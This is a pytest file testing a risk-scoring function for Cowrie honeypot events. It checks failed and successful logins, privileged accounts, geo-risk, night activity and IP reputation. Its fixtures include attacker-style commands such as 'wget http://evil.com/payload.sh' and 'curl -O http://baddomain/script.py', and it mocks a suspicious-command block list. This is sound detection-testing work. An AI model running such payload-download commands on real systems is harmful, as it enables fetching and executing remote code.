
import pytest
from datetime import datetime, timezone
from unittest.mock import patch
from sentinel.core.services import _score_event
from sentinel.config.settings import settings

# A fixed timestamp for consistent testing
TEST_TIMESTAMP = datetime.now(timezone.utc)

# Test cases for the _score_event function
# Each tuple contains: (event_type, src_dict, expected_score, expected_factors)
risk_score_test_cases = [
    # --- Basic Cases ---
    ("unknown", {}, 0, []),
    ("cowrie.login.failed", {}, 10, ["failed_login"]),
    ("cowrie.login.success", {}, 80, ["successful_login"]),
    ("cowrie.command.input", {"input": "ls -la"}, 5, ["command_input"]),
    ("cowrie.session.file_download", {}, 40, ["file_transfer"]),

    # --- Suspicious Commands ---
    ("cowrie.command.input", {"input": "wget http://evil.com/payload.sh"}, 35, ["command_input", "suspicious_command"]),
    ("cowrie.command.input", {"input": "curl -O http://baddomain/script.py"}, 35, ["command_input", "suspicious_command"]),
    ("cowrie.command.input", {"input": "uname -a; apt-get install -y python"}, 35, ["command_input", "suspicious_command"]),

    # --- Contextual Factors ---
    ("cowrie.login.failed", {"username": "root"}, 25, ["failed_login", "privileged_account"]),
    ("cowrie.login.success", {"username": "admin"}, 95, ["successful_login", "privileged_account"]),
    ("cowrie.login.failed", {"geoip": {"country_name": "Russia"}}, 20, ["failed_login", "geo_risk"]),

    # --- Combination Scoring ---
    (
        "cowrie.login.success",
        {"username": "root", "geoip": {"country_name": "North Korea"}},
        100, # 80 (login) + 15 (root) + 10 (geo) = 105, clamped to 100
        ["successful_login", "privileged_account", "geo_risk"],
    ),
    (
        "cowrie.command.input",
        {"username": "admin", "input": "wget http://some.site/payload"},
        50, # 5 (cmd) + 30 (suspicious) + 15 (admin) = 50
        ["command_input", "suspicious_command", "privileged_account"],
    ),
    
    # --- Night Activity ---
    (
        "cowrie.login.failed", 
        {}, 
        15, # 10 (failed_login) + 5 (night)
        ["failed_login", "night_activity"],
    ),

    # --- IP Reputation ---
    (
        "cowrie.login.failed",
        {"src_ip": "1.2.3.4"},
        60, # 10 (failed_login) + 50 (ip_reputation)
        ["failed_login", "ip_reputation_risk"],
    ),
]

@pytest.mark.asyncio
@pytest.mark.parametrize("event_type, src, expected_score, expected_factors", risk_score_test_cases)
async def test_score_event(event_type, src, expected_score, expected_factors):
    """
    Tests the _score_event function with various event payloads and contexts.
    """
    # Use a fixed timestamp that falls into the "night activity" window for relevant tests
    timestamp = TEST_TIMESTAMP.replace(hour=3) if "night_activity" in expected_factors else TEST_TIMESTAMP.replace(hour=12)
    
    # Mock settings for consistent testing
    settings.SUSPICIOUS_COMMANDS = ["wget", "curl", "apt-get", "yum"]
    settings.GEOIP_RISK_COUNTRIES = ["Russia", "North Korea", "Iran"]

    with patch('sentinel.core.services._check_ip_reputation') as mock_check_ip:
        # Mock the return value of the IP reputation check
        mock_check_ip.return_value = "ip_reputation_risk" in expected_factors
        
        score, factors = await _score_event(event_type=event_type, src=src, timestamp=timestamp)
    
    assert score == expected_score
    assert set(factors) == set(expected_factors)

@pytest.mark.asyncio
async def test_score_clamping():
    """
    Ensures the score is always clamped between 0 and 100.
    """
    # This combination should exceed 100
    event_type = "cowrie.login.success"
    src = {
        "username": "root",
        "input": "wget evil.sh",
        "geoip": {"country_name": "Russia"}
    }
    timestamp = datetime.now(timezone.utc)
    
    with patch('sentinel.core.services._check_ip_reputation') as mock_check_ip:
        mock_check_ip.return_value = True
        # Manually calculate expected score without clamping to prove the point
        # 80 (login) + 15 (root) + 10 (geo) + 50 (ip_rep) = 155
        
        score, _ = await _score_event(event_type=event_type, src=src, timestamp=timestamp)
        assert score == 100
